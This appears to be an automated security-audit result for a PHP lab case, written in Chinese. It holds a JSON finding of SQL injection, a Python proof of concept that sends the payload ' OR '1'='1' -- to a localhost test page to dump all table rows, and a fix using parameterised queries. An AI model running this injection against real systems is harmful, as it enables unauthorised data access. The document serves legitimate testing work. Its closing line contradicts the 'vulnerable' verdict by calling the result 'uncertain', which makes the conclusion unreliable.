@@ -1,0 +1,89 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 读取外部输入，未做SQL相关处理。",
+    "flow": "F01:0007 的 $name 在 F01:0010 被直接拼接进 WHERE name = '...' 的SQL字符串，随后在 F01:0011 执行。",
+    "guard": "无效：F01:0010 使用字符串拼接构造SQL；F01:0022-F01:0023 的 htmlspecialchars 仅对HTML输出有效，不能阻止SQL结构注入。",
+    "sink": "F01:0011 $db->query($sql) 执行包含外部输入的拼接SQL。"
+  },
+  "prerequisites": [
+    "入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可达",
+    "common/db_connect.php 提供已连接的 mysqli 变量 $db",
+    "lab_people 表存在并预置 1 Alice、2 Bob、3 Carol",
+    "name 参数可通过 GET 控制",
+    "数据库用户对 lab_people 具有 SELECT 权限"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未提供；当前SQL注入路径判断不依赖其内部细节"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "保存为 poc_s001.py，运行 python3 poc_s001.py。脚本仅请求 127.0.0.1:4280，先请求 name=Alice，再请求 name=' OR '1'='1' -- （脚本自动URL编码）。预期普通正文仅含 ID 1：Alice；测试正文含 ID 1：Alice、ID 2：Bob、ID 3：Carol。判定基于正文解析出的行集合，不以HTTP 200为成功。若未观察到，检查入口路径、$db连接、lab_people预置数据、SELECT权限及URL编码。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import re
+from urllib.parse import urlencode
+from urllib.request import Request, urlopen
+
+BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+ROW_RE = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>")
+
+
+def fetch(name):
+    url = BASE + "?" + urlencode({"name": name})
+    req = Request(url, headers={"User-Agent": "S001-local-audit"})
+    with urlopen(req, timeout=5) as resp:
+        body = resp.read().decode("utf-8", "replace")
+    return url, body
+
+
+def extract_rows(body):
+    return [(m.group(1), m.group(2)) for m in ROW_RE.finditer(body)]
+
+
+def main():
+    normal_name = "Alice"
+    test_name = "' OR '1'='1' -- "
+
+    try:
+        normal_url, normal_body = fetch(normal_name)
+        test_url, test_body = fetch(test_name)
+    except Exception as exc:
+        print("REQUEST_FAILED:", repr(exc))
+        print("检查入口是否运行、路径是否正确、$db 是否可用。")
+        return 1
+
+    normal_rows = extract_rows(normal_body)
+    test_rows = extract_rows(test_body)
+
+    print("普通URL:", normal_url)
+    print("普通行:", normal_rows)
+    print("测试URL:", test_url)
+    print("测试行:", test_rows)
+
+    expected_normal = [("1", "Alice")]
+    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+    if normal_rows == expected_normal and expected_test.issubset(set(test_rows)):
+        print("OBSERVED: 普通仅Alice，测试返回全部预置行，符合拼接SQL注入的本地观察。")
+        return 0
+
+    print("NOT_OBSERVED: 未得到预期正文行集合；不要以HTTP 200判定。")
+    print("检查：入口路径、common/db_connect.php 的 $db 连接、lab_people 预置数据、SELECT 权限、payload 是否被URL编码。")
+    return 2
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+防护建议（未验证）：对 `name` 使用预处理语句与参数绑定，例如 `WHERE name = ?` 并 `bind_param('s', $name)`；不要将外部输入拼接进SQL结构。HTML输出转义不能替代SQL参数化。
+
+请提供包含 `sample_id` 的标准化代码输入包；当前无法确认目标类型，故输出 `uncertain`。
